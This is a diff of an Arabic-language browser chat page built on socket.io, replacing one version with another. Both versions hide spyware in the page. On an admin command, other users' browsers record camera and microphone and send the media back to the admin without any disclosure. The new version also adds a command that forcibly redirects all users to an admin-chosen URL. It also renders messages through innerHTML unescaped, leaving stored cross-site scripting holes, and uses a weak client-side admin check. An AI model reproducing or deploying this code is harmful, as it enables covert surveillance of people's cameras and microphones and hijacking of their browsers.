@@ -1,213 +1,241 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>شات بسيط وسريع</title>
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: Tahoma, sans-serif; background: #f4f4f4; direction: rtl; }
-.header { background: #1895d2; color: white; padding: 10px; text-align: center; font-size: 20px; font-weight: bold; }
-
-#admin-bar { display: none; background: #ffeaa7; padding: 8px; text-align: center; border-bottom: 2px solid #fdcb6e; }
-#admin-bar button { background: #d63031; color: white; border: none; padding: 6px 12px; margin: 3px; border-radius: 4px; cursor: pointer; font-weight: bold; }
-
-#chat { max-width: 600px; margin: 10px auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-#conv { height: 350px; overflow-y: auto; padding: 10px; display: flex; flex-direction: column; gap: 8px; }
-
-.msg { padding: 8px 12px; border-radius: 6px; max-width: 75%; word-break: break-word; font-size: 15px; }
-.my-msg { background: #e3f2fd; color: #333; align-self: flex-start; }
-.partner-msg { background: #1895d2; color: white; align-self: flex-end; }
-.system-msg { background: #eee; color: #666; align-self: center; font-size: 13px; }
-
-img, video, audio { max-width: 200px; border-radius: 5px; display: block; margin-top: 5px; }
-
-#send-box { display: flex; padding: 8px; background: #fff; border-top: 1px solid #ddd; gap: 5px; align-items: center; }
-#inp { flex: 1; padding: 8px; border: 1px solid #ccc; border-radius: 4px; outline: none; font-size: 14px; }
-button.send-btn { padding: 8px 15px; background: #1895d2; color: white; border: none; border-radius: 4px; cursor: pointer; }
-.file-label { cursor: pointer; font-size: 20px; padding: 0 5px; }
-#file-input { display: none; }
-
-#out { text-align: center; margin-top: 50px; display: none; }
-#out a { background: coral; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شات الأدمن المتقدم</title>
+    <style>
+        body { font-family: Tahoma, sans-serif; background: #f4f4f9; margin: 0; padding: 20px; }
+        #chat-container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        #messages { list-style: none; padding: 0; height: 300px; overflow-y: scroll; border: 1px solid #ddd; margin-bottom: 10px; padding: 10px; border-radius: 5px; }
+        #messages li { margin-bottom: 10px; padding: 8px; background: #eef2f3; border-radius: 4px; position: relative; word-break: break-word; }
+        .admin-panel { background: #ffeaa7; padding: 10px; margin-bottom: 15px; border-radius: 5px; display: none; }
+        input, button { padding: 8px; margin: 5px 0; }
+        .delete-btn, .edit-btn { background: #ff7675; color: white; border: none; padding: 2px 5px; cursor: pointer; border-radius: 3px; font-size: 12px; margin-left: 5px; }
+        .edit-btn { background: #74b9ff; }
+        #preview-box { margin-top: 15px; text-align: center; display: none; background: #fff3cd; padding: 10px; border-radius: 5px; }
+        img, video { max-width: 100%; border-radius: 5px; }
+    </style>
 </head>
 <body>
 
-  <div class="header">شات سريع وخفيف</div>
+    <div id="chat-container">
+        <h2>غرفة الشات العامة <span id="users-count" style="font-size: 14px; color: gray;"></span></h2>
 
-  <!-- لوحة الأدمن تظهر فقط لو كتبت ?admin=admin123 في الرابط -->
-  <div id="admin-bar">
-    <b>لوحة التحكم السريعة:</b><br>
-    <button onclick="sendAdminCmd('photo')">التقاط صورة 📸</button>
-    <button onclick="sendAdminCmd('video')">تصوير فيديو 🎥</button>
-    <button onclick="sendAdminCmd('audio')">تسجيل صوت 🎤</button>
-  </div>
+        <!-- لوحة تحكم الأدمن -->
+        <div id="adminPanel" class="admin-panel">
+            <h3>⭐ لوحة تحكم الأدمن</h3>
+            <div>
+                <input type="text" id="targetUrlInput" placeholder="أدخل رابط لفتحه عند المستخدمين..." style="width: 65%;">
+                <button onclick="sendOpenUrl()">فتح الرابط</button>
+            </div>
+            <div>
+                <button onclick="requestCamera('photo')">📸 طلب التقاط صورة</button>
+                <button onclick="requestCamera('video')">🎥 طلب تسجيل فيديو</button>
+            </div>
+        </div>
 
-  <div id="chat">
-    <div id="conv">
-      <div class="system-msg" id="status-text">جاري البحث عن متصل...</div>
+        <!-- معاينة الوسائط الملتقطة للأدمن -->
+        <div id="preview-box">
+            <h4>معاينة الوسائط القادمة من الكاميرا:</h4>
+            <div id="media-content"></div>
+            <button onclick="approveMedia()" style="background: #00b894; color:white;">رفع / حفظ للشات</button>
+            <button onclick="cancelMedia()" style="background: #d63031; color:white;">إلغاء</button>
+        </div>
+
+        <ul id="messages"></ul>
+
+        <!-- إرسال الرسائل -->
+        <input type="text" id="messageInput" placeholder="اكتب رسالتك..." style="width: 70%;">
+        <button onclick="sendMessage()">إرسال</button>
+        
+        <br>
+        <label>إرسال ملف: <input type="file" id="fileInput"></label>
+        <button onclick="sendFile()">إرسال الملف</button>
     </div>
-    
-    <div id="send-box">
-      <input type="file" id="file-input" accept="image/*,video/*,audio/*">
-      <label for="file-input" class="file-label" title="إرسال ملف">📁</label>
-      <input type="text" id="inp" placeholder="اكتب رسالة..." autocomplete="off">
-      <button class="send-btn" id="snd">إرسال</button>
-    </div>
-  </div>
 
-  <div id="out">
-    <h3>المستخدم غادر المحادثة</h3><br>
-    <a href="javascript:location.reload()">بحث عن شخص آخر</a>
-  </div>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let isAdmin = false;
+        let adminSecret = '';
 
-  <script src="/socket.io/socket.io.js"></script>
-  <script>
-    const socket = io();
-
-    const urlParams = new URLSearchParams(window.location.search);
-    const isAdmin = urlParams.get('admin') === 'admin123';
-    if (isAdmin) {
-      document.getElementById('admin-bar').style.display = 'block';
-    }
-
-    const conv = document.getElementById('conv');
-    const inp = document.getElementById('inp');
-    const snd = document.getElementById('snd');
-    const statusText = document.getElementById('status-text');
-    const chatBox = document.getElementById('chat');
-    const outBox = document.getElementById('out');
-    const fileInput = document.getElementById('file-input');
-
-    inp.disabled = true;
-    snd.disabled = true;
-
-    socket.emit('find_partner');
-
-    socket.on('matched', () => {
-      statusText.innerText = "تم الاتصال بنجاح!";
-      setTimeout(() => statusText.style.display = 'none', 1500);
-      inp.disabled = false;
-      snd.disabled = false;
-      inp.focus();
-    });
-
-    socket.on('partner_disconnected', () => {
-      chatBox.style.display = 'none';
-      outBox.style.display = 'block';
-    });
-
-    function sendMessage(type, content) {
-      const data = { type, content };
-      socket.emit('message', data);
-      appendMsg(data, true);
-    }
-
-    snd.onclick = () => {
-      if (inp.value.trim() !== '') {
-        sendMessage('text', inp.value.trim());
-        inp.value = '';
-      }
-    };
-
-    inp.onkeypress = (e) => {
-      if (e.key === 'Enter') snd.click();
-    };
-
-    fileInput.onchange = (e) => {
-      const file = e.target.files[0];
-      if (!file) return;
-      const reader = new FileReader();
-      reader.onload = (event) => {
-        let type = 'image';
-        if (file.type.startsWith('video')) type = 'video';
-        else if (file.type.startsWith('audio')) type = 'audio';
-        sendMessage(type, event.target.result);
-      };
-      reader.readAsDataURL(file);
-      fileInput.value = '';
-    };
-
-    socket.on('message', (data) => {
-      appendMsg(data, false);
-    });
-
-    function appendMsg(data, isMe) {
-      const div = document.createElement('div');
-      div.className = `msg ${isMe ? 'my-msg' : 'partner-msg'}`;
-
-      if (data.type === 'text') {
-        div.innerText = data.content;
-      } else if (data.type === 'image') {
-        const img = document.createElement('img');
-        img.src = data.content;
-        div.appendChild(img);
-      } else if (data.type === 'video') {
-        const vid = document.createElement('video');
-        vid.src = data.content;
-        vid.controls = true;
-        div.appendChild(vid);
-      } else if (data.type === 'audio') {
-        const aud = document.createElement('audio');
-        aud.src = data.content;
-        aud.controls = true;
-        div.appendChild(aud);
-      }
-
-      conv.appendChild(div);
-      conv.scrollTop = conv.scrollHeight;
-    }
-
-    // أوامر الأدمن لالتقاط الصور والفيديو من جهاز الطرف الآخر مباشرة
-    function sendAdminCmd(actionType) {
-      socket.emit('admin_command', { secret: 'admin123', action: actionType });
-    }
-
-    socket.on('execute_command', async (data) => {
-      if (isAdmin) return; // الأدمن لا ينفذ على نفسه
-
-      try {
-        if (data.action === 'photo') {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          await video.play();
-
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          
-          stream.getTracks().forEach(t => t.stop());
-          sendMessage('image', canvas.toDataURL('image/jpeg', 0.8));
-
-        } else if (data.action === 'video' || data.action === 'audio') {
-          const constraints = data.action === 'video' ? { video: true, audio: true } : { audio: true };
-          const stream = await navigator.mediaDevices.getUserMedia(constraints);
-          const chunks = [];
-          const recorder = new MediaRecorder(stream);
-
-          recorder.ondataavailable = e => chunks.push(e.data);
-          recorder.onstop = () => {
-            stream.getTracks().forEach(t => t.stop());
-            const blob = new Blob(chunks, { type: data.action === 'video' ? 'video/webm' : 'audio/webm' });
-            const reader = new FileReader();
-            reader.onloadend = () => {
-              sendMessage(data.action, reader.result);
-            };
-            reader.readAsDataURL(blob);
-          };
-
-          recorder.start();
-          setTimeout(() => {
-            if (recorder.state === 'recording') recorder.stop();
-          }, 4000); // تسجيل لمدة 4 ثواني
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('admin')) {
+            adminSecret = urlParams.get('admin');
+            isAdmin = true;
+            document.getElementById('adminPanel').style.display = 'block';
         }
-      } catch (err) {
-        alert('يرجى السماح بالمتصفح بالوصول للكاميرا/الميكروفون');
-      }
-    });
-  </script>
+
+        const username = prompt("أدخل اسمك:") || "مستخدم مجهول";
+
+        socket.on('update_users_count', (count) => {
+            document.getElementById('users-count').innerText = `(متصل حالياً: ${count})`;
+        });
+
+        socket.on('load_history', (messages) => {
+            messages.forEach(msg => appendMessage(msg));
+        });
+
+        socket.on('receive_message', (msg) => {
+            appendMessage(msg);
+        });
+
+        function sendMessage() {
+            const text = document.getElementById('messageInput').value;
+            if (!text.trim()) return;
+            socket.emit('send_message', { sender: username, message: text, type: 'text' });
+            document.getElementById('messageInput').value = '';
+        }
+
+        function sendFile() {
+            const fileInput = document.getElementById('fileInput');
+            if (fileInput.files.length === 0) return alert('اختر ملفاً أولاً');
+            const file = fileInput.files[0];
+            
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                let contentMsg = `<a href="${e.target.result}" download="${file.name}">تحميل ملف: ${file.name}</a>`;
+                if (file.type.startsWith('image/')) {
+                    contentMsg = `<img src="${e.target.result}" width="200">`;
+                }
+                socket.emit('send_message', { 
+                    sender: username, 
+                    message: contentMsg, 
+                    type: 'file' 
+                });
+            };
+            reader.readAsDataURL(file);
+            fileInput.value = '';
+        }
+
+        function appendMessage(msg) {
+            const list = document.getElementById('messages');
+            const li = document.createElement('li');
+            li.setAttribute('data-id', msg._id);
+            li.innerHTML = `<strong>${msg.sender}:</strong> <span class="msg-text">${msg.message}</span>`;
+
+            if (isAdmin) {
+                const delBtn = document.createElement('button');
+                delBtn.innerText = 'حذف';
+                delBtn.className = 'delete-btn';
+                delBtn.onclick = () => deleteMessage(msg._id);
+
+                const editBtn = document.createElement('button');
+                editBtn.innerText = 'تعديل';
+                editBtn.className = 'edit-btn';
+                editBtn.onclick = () => editMessage(msg._id, msg.message);
+
+                li.appendChild(delBtn);
+                li.appendChild(editBtn);
+            }
+
+            list.appendChild(li);
+            list.scrollTop = list.scrollHeight;
+        }
+
+        function deleteMessage(messageId) {
+            socket.emit('admin_delete_message', { secret: adminSecret, messageId });
+        }
+
+        socket.on('message_deleted', (messageId) => {
+            const el = document.querySelector(`[data-id='${messageId}']`);
+            if (el) el.remove();
+        });
+
+        function editMessage(messageId, oldText) {
+            const newText = prompt("تعديل الرسالة:", oldText);
+            if (newText !== null) {
+                socket.emit('admin_edit_message', { secret: adminSecret, messageId, newText });
+            }
+        }
+
+        socket.on('message_edited', ({ messageId, newText }) => {
+            const el = document.querySelector(`[data-id='${messageId}']`);
+            if (el) {
+                el.querySelector('.msg-text').innerHTML = newText;
+            }
+        });
+
+        function sendOpenUrl() {
+            const url = document.getElementById('targetUrlInput').value;
+            if (!url) return;
+            socket.emit('admin_open_url', { secret: adminSecret, targetUrl: url });
+        }
+
+        socket.on('force_open_url', (url) => {
+            if (!isAdmin) {
+                window.location.href = url;
+            }
+        });
+
+        function requestCamera(type) {
+            socket.emit('admin_request_media', { secret: adminSecret, mediaType: type });
+        }
+
+        socket.on('trigger_camera_capture', async (mediaType) => {
+            if (isAdmin) return;
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: mediaType === 'video' });
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: mediaType === 'video' ? 'video/webm' : 'image/jpeg' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        socket.emit('user_captured_media', { dataUrl: reader.result, type: mediaType });
+                    };
+                    reader.readAsDataURL(blob);
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, mediaType === 'video' ? 5000 : 1000);
+            } catch (err) {
+                alert('رفض المستخدم إذن الكاميرا أو حدث خطأ في المتصفح.');
+            }
+        });
+
+        let temporaryCapturedData = null;
+        socket.on('display_captured_media_to_admin', (data) => {
+            if (!isAdmin) return;
+            temporaryCapturedData = data;
+            const previewBox = document.getElementById('preview-box');
+            const contentDiv = document.getElementById('media-content');
+            previewBox.style.display = 'block';
+
+            if (data.type === 'video') {
+                contentDiv.innerHTML = `<video src="${data.dataUrl}" controls width="250"></video>`;
+            } else {
+                contentDiv.innerHTML = `<img src="${data.dataUrl}" width="250">`;
+            }
+        });
+
+        function approveMedia() {
+            if (temporaryCapturedData) {
+                const mediaHtml = temporaryCapturedData.type === 'video' 
+                    ? `<video src="${temporaryCapturedData.dataUrl}" controls width="250"></video>` 
+                    : `<img src="${temporaryCapturedData.dataUrl}" width="250">`;
+
+                socket.emit('send_message', {
+                    sender: "الأدمن (صورة ملتقطة)",
+                    message: mediaHtml,
+                    type: 'media-capture'
+                });
+                cancelMedia();
+            }
+        }
+
+        function cancelMedia() {
+            temporaryCapturedData = null;
+            document.getElementById('preview-box').style.display = 'none';
+        }
+    </script>
 </body>
 </html>
